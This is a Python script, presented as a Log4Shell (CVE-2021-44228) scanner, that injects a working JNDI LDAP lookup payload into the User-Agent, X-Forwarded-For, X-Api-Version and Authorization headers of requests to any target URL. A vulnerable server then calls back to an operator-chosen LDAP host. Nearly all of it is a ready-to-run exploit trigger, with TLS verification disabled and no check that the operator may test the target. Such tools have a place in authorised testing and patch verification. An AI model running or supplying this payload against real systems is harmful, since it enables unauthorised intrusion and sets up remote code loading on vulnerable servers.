#!/usr/bin/env python3
"""
Log4Shell (CVE-2021-44228) Scanner
Detects vulnerable Apache Log4j2 instances
"""
import requests
import sys
import uuid

def generate_payload(callback_host, callback_port=1389):
    """Generate JNDI lookup payload"""
    return f"${{jndi:ldap://{callback_host}:{callback_port}/a}}"

def scan_target(url, callback_host, headers=None):
    """Scan a target URL for Log4Shell vulnerability"""
    payload = generate_payload(callback_host)

    # Common injection points
    injection_headers = {
        "User-Agent": payload,
        "X-Forwarded-For": payload,
        "X-Api-Version": payload,
        "Authorization": f"Bearer {payload}",
    }

    if headers:
        injection_headers.update(headers)

    try:
        response = requests.get(url, headers=injection_headers, timeout=10, verify=False)
        print(f"[*] Sent payloads to {url} - Status: {response.status_code}")
        return True
    except Exception as e:
        print(f"[-] Error scanning {url}: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_url> <callback_host>")
        sys.exit(1)

    target = sys.argv[1]
    callback = sys.argv[2]

    print(f"[*] Scanning {target} with callback to {callback}")
    scan_target(target, callback)
    print("[*] Check your LDAP/DNS callback server for connections")
